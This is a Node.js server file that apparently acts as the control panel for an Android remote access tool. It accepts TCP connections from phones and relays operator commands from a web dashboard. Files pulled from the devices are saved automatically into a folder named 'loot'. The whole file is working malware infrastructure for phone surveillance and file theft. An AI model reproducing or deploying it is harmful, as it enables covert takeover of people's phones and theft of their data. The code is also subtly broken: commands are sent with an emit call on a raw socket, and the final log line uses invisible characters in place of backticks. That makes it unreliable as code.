const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);
const path = require('path');
const net = require('net');
const fs = require('fs');

const LOOT_DIR = path.join(__dirname, 'loot');
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

app.use(express.static(path.join(__dirname, 'public')));

const devices = {};

// TCP server for Android app connections
const TCP_PORT = 8080;
const tcpServer = net.createServer((socket) => {
    console.log('Android device connected via TCP');

    let deviceId = null;
    let buffer = '';

    socket.on('data', (data) => {
        console.log(`TCP Data from ${socket.remoteAddress}: ${data.length} bytes`);
        buffer += data.toString();
        let lines = buffer.split('\n');
        buffer = lines.pop();

        for (let line of lines) {
            const message = line.trim();
            if (!message) continue;

            console.log(`Processing message: ${message.substring(0, 50)}${message.length > 50 ? '...' : ''}`);

            if (message.startsWith('DEVICE_INFO:')) {
                const info = message.substring(12);
                deviceId = "Device_" + socket.remoteAddress.replace(/[^0-9]/g, '');

                devices[deviceId] = {
                    id: deviceId,
                    socket: socket,
                    type: 'android',
                    status: 'connected',
                    lastSeen: new Date(),
                    info: info
                };

                io.emit('device_connected', {
                    id: deviceId,
                    status: 'connected',
                    lastSeen: devices[deviceId].lastSeen
                });

                io.emit('device_response', {
                    deviceId: deviceId,
                    type: 'DEVICE_INFO_RESPONSE',
                    data: info
                });
            } else if (message.includes('_RESPONSE:')) {
                const index = message.indexOf(':');
                const type = message.substring(0, index);
                const data = message.substring(index + 1);

                console.log(`Emitting ${type} for ${deviceId} (${data.length} bytes)`);
                io.emit('device_response', {
                    deviceId: deviceId,
                    type: type,
                    data: data
                });

                // Auto-save downloaded files to 'loot' folder
                if (type === 'DOWNLOAD_RESPONSE') {
                    try {
                        const parts = data.split(':');
                        if (parts[0] !== 'ERROR') {
                            const fileName = parts[0];
                            const base64Data = parts[1];
                            const filePath = path.join(LOOT_DIR, `${Date.now()}_${fileName}`);
                            fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
                            console.log(`File saved to: ${filePath}`);
                        }
                    } catch (err) {
                        console.error('Error saving file:', err);
                    }
                }
            }
        }
    });

    socket.on('end', () => {
        if (deviceId && devices[deviceId]) {
            devices[deviceId].status = 'disconnected';
            io.emit('device_disconnected', { id: deviceId });
        }
        console.log('Android device disconnected');
    });

    socket.on('error', (err) => {
        console.error('TCP Socket Error:', err);
    });
});

tcpServer.listen(TCP_PORT, '0.0.0.0', () => {
    console.log(`TCP Server listening on port ${TCP_PORT}`);
});

io.on('connection', (socket) => {
    console.log('Dashboard client connected');

    for (const id in devices) {
        socket.emit('device_connected', {
            id: devices[id].id,
            status: devices[id].status,
            lastSeen: devices[id].lastSeen
        });
    }

    socket.on('command', (data) => {
        const { deviceId, command, params } = data;
        const device = devices[deviceId];

        if (device && device.socket) {
            console.log(`Sending command to ${deviceId}: ${command}:${params || ''}`);
       device.socket.emit('command', {
  command: command,
  params: params
});
        }
    });
});

const HTTP_PORT = process.env.PORT || 3000;

server.listen(HTTP_PORT, '0.0.0.0', () => {
  console.log(⁠ Server running on port ${HTTP_PORT} ⁠);
});
